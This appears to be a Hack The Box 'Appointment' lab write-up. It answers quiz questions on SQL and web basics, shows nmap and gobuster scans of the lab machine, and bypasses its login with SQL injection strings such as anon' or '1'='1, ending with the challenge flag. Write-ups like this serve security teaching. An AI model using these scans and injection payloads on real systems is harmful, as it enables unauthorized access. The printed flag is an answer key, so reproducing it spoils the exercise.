Connect the VPN, spawn the VM.<br>
10.129.223.238

### TASK 1

What does the acronym SQL stand for?

Answer: Structured Query Language

### TASK 2

What is one of the most common type of SQL vulnerabilities?

Answer: SQL Injection

### TASK 3

What does PII stand for?

Answer: Personally Identifiable Information

### TASK 4

What does the OWASP Top 10 list name the classification for this vulnerability?

https://owasp.org/www-project-top-ten/
https://owasp.org/Top10/A03_2021-Injection/

Answer: A03:2021-Injection (its case sensitive)

### TASK 5

What service and version are running on port 80 of the target?

```
# nmap -sS 10.129.223.238 -p80 -sV -Pn
Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-02 17:26 EDT
Nmap scan report for 10.129.223.238
Host is up (0.22s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.38 ((Debian))

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.16 seconds
```

Answer: Apache httpd 2.4.38 ((Debian))

### TASK 6

What is the standard port used for the HTTPS protocol?

Answer: 443

### Task 7

What is one luck-based method of exploiting login pages?

Answer: brute-forcing

### TASK 8

What is a folder called in web-application terminology?

Answer: directory

### TASK 9

What response code is given for "Not Found" errors?

404

### TASK 10

What switch do we use with Gobuster to specify we're looking to discover directories, and not subdomains?

```
# gobuster --help
Usage:
  gobuster [command]

Available Commands:
  dir         Uses directory/file enumeration mode
  dns         Uses DNS subdomain enumeration mode
  fuzz        Uses fuzzing mode
  help        Help about any command
  s3          Uses aws bucket enumeration mode
  version     shows the current version
  vhost       Uses VHOST enumeration mode

Flags:
      --delay duration    Time each thread waits between requests (e.g. 1500ms)
  -h, --help              help for gobuster
      --no-error          Don't display errors
  -z, --no-progress       Don't display progress
  -o, --output string     Output file to write results to (defaults to stdout)
  -p, --pattern string    File containing replacement patterns
  -q, --quiet             Don't print the banner and other noise
  -t, --threads int       Number of concurrent threads (default 10)
  -v, --verbose           Verbose output (errors)
  -w, --wordlist string   Path to the wordlist

Use "gobuster [command] --help" for more information about a command.
```

Answer: dir

### TASK 11

What symbol do we use to comment out parts of the code?

Answer: #


### SUBMIT FLAG

Submit root flag

```
# gobuster dir -u 10.129.223.238 -x php --wordlist /usr/share/wordlists/dirb/small.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.223.238
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
2022/10/02 17:32:54 Starting gobuster in directory enumeration mode
===============================================================
/css                  (Status: 301) [Size: 314] [--> http://10.129.223.238/css/]
/images               (Status: 301) [Size: 317] [--> http://10.129.223.238/images/]
/index.php            (Status: 200) [Size: 4896]
/js                   (Status: 301) [Size: 313] [--> http://10.129.223.238/js/]

===============================================================
2022/10/02 17:33:39 Finished
===============================================================
```


Using https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#authentication-bypass

I first tried
```
anon' or '1'='1
```
and the same for the password and it worked.

I also tested ```
```
'-'
```

And it worked as well.

![[hackthebox/HTB-Appointment/image1.png]]

![[hackthebox/HTB-Appointment/image2.png]]

Congratulations!
Your flag is: e3d0796d002a446c0e622226f42e9672